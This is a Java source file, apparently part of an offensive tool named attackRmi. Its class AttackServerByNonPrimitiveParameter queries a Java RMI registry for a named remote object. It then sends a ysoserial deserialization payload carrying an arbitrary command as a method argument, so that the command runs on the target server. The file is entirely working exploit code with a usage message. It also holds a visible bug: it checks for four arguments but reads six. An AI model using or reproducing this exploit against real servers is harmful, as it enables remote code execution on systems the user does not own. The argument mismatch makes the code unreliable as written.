package com.wu.attackRmi.Exploit;

import com.wu.attackRmi.utils.KMPMatch;
import com.wu.attackRmi.utils.Stub;
import com.wu.attackRmi.utils.ComputeMethodHash;
import ysoserial.payloads.ObjectPayload;

import java.io.ByteArrayInputStream;
import java.io.ObjectInputStream;
import java.rmi.server.ObjID;

public class AttackServerByNonPrimitiveParameter {
    public static void main(String[] args) throws Exception {
        if (args.length != 4) {
            printUsage();
            System.exit(64);
        }

        final String registryHost = args[0];
        final int registryPort = Integer.parseInt(args[1]);
        final String name = args[2];
        final String methodSignature = args[3]; //sayHello(Ljava/lang/String;)Ljava/lang/String;
        final String payloadType = args[4];
        final String command = args[5];

        System.out.println("Attacking: "+ registryHost + ":" + registryPort);
        System.out.println("Method: "+ methodSignature);
        System.out.println("Payload: "+ payloadType);
        System.out.println("command: "+ command);

        final Class payloadClass = ObjectPayload.Utils.getPayloadClass(payloadType);
        final ObjectPayload payload = (ObjectPayload) payloadClass.newInstance();
        final Object payloadObject = payload.getObject(command);

        attack(registryHost, registryPort, name, methodSignature, payloadObject);
    }

    public static void attack(String registryHost, int registryPort, String lookupName, String methodSignature, Object payloadObject) throws Exception{
        ObjID objID_ = new ObjID(0);
        //Lookup
        byte[] returnData = Stub.exploit(registryHost, registryPort, lookupName, objID_, 2, 4905912898345647071L);

        int index = KMPMatch.indexOf(returnData, "UnicastRef".getBytes());
        byte [] serializationData = new byte[6+returnData.length-index-10];
        serializationData[0] = (byte)0xac;
        serializationData[1] = (byte)0xed;
        serializationData[2] = (byte)0x00;
        serializationData[3] = (byte)0x05;
        serializationData[4] = (byte)0x77; // TC_BLOCKDATA
        serializationData[5] = (byte)(returnData.length-index-10); //Length
        System.arraycopy(returnData, index+10, serializationData, 6, returnData.length-index-10);
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(serializationData);
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        String tcp_host = objectInputStream.readUTF();
        int tcp_port = objectInputStream.readInt();
        ObjID objID = ObjID.read(objectInputStream);
        long hash = ComputeMethodHash.computeMethodHash(methodSignature);
        Stub.exploit(tcp_host, tcp_port, payloadObject, objID,-1, hash);
    }

    private static void printUsage() {
        System.err.println("AttackServerByNonPrimitiveParameter");
        System.err.println("Usage: java -cp attackRmi.jar com.wu.attackRmi.Exploit.AttackServerByNonPrimitiveParameter [registryHost] [registryPort] [name] [methodSignature] [payloadType] [command]");
    }
}
